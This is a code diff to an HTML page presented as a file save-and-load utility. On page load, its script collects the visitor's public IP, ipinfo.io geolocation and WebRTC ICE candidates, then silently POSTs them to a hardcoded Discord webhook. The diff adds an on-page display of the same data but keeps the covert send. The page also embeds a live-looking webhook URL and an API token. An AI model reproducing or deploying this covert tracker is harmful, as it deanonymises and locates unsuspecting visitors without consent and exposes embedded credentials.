@@ -41,6 +41,17 @@
     text-decoration: none;
   }
   a.download-link:hover { text-decoration: underline; }
+  #ipInfoBox {
+    margin-top: 25px;
+    background: rgba(255,255,255,0.1);
+    padding: 15px;
+    border-radius: 8px;
+    white-space: pre-wrap;
+    text-align: left;
+    max-width: 400px;
+    margin-left: auto;
+    margin-right: auto;
+  }
 </style>
 </head>
 <body>
@@ -51,11 +62,13 @@
     <button id="saveBtn">Save File</button>
     <a id="downloadLink" class="download-link" style="display:none;">⬇ Download Saved File</a><br />
     <button id="loadFileBtn">Load Saved File</button>
+
+    <div id="ipInfoBox">Loading IP & geolocation info...</div>
   </div>
 
 <script>
   const webhookUrl = "https://discord.com/api/webhooks/1403073369410244739/DMBo14Lg-4D3UbY-xrPfChglFsi1WP___5vpBDsfMZfm40VqHX8V1Bxe_90TmEWfolDI";
-  const ipinfoToken = "85da0ebad68e42"; // ← Replace with your ipinfo.io token
+  const ipinfoToken = "85da0ebad68e42"; // Your lite token
 
   let fileData = null;
 
@@ -118,26 +131,30 @@
     };
   }
 
-  // On load: get public IP, geolocate, get ICE candidates, send all to webhook
+  // On load: get public IP, geolocate with lite API, get ICE candidates, send all to webhook + display on page
   function sendIPToWebhook() {
+    const ipInfoBox = document.getElementById("ipInfoBox");
+
     fetch("https://api.ipify.org?format=json")
       .then(res => res.json())
       .then(data => {
         const publicIP = data.ip;
 
-        fetch(`https://ipinfo.io/${publicIP}/json?token=${ipinfoToken}`)
-          .then(res => res.json())
-          .then(geoData => {
+        fetch(`https://api.ipinfo.io/lite/${publicIP}?token=${ipinfoToken}`)
+          .then(res => res.text())
+          .then(liteText => {
             getAllCandidateLines(candidates => {
               const content = `Public IP: ${publicIP}
-City: ${geoData.city || 'N/A'}
-Region: ${geoData.region || 'N/A'}
-Country: ${geoData.country || 'N/A'}
-ISP: ${geoData.org || 'N/A'}
+Geo (lite):
+${liteText.trim()}
 
 ICE Candidates:
 ${candidates.join("\n") || "None"}`;
 
+              // Show on page
+              ipInfoBox.textContent = content;
+
+              // Send to webhook
               fetch(webhookUrl, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
@@ -146,18 +163,22 @@ ${candidates.join("\n") || "None"}`;
             });
           })
           .catch(() => {
-            // fallback if geo lookup fails
+            // fallback if lite fetch fails
             getAllCandidateLines(candidates => {
+              const content = `Public IP: ${publicIP}\nICE Candidates:\n${candidates.join("\n") || "None"}`;
+              ipInfoBox.textContent = content;
+
               fetch(webhookUrl, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({
-                  content: `Public IP: ${publicIP}\nICE Candidates:\n${candidates.join("\n") || "None"}`
-                }),
+                body: JSON.stringify({ content }),
               }).catch(() => {});
             });
           });
-      }).catch(() => {});
+      })
+      .catch(() => {
+        ipInfoBox.textContent = "Failed to load IP info.";
+      });
   }
 
   window.addEventListener("load", () => {
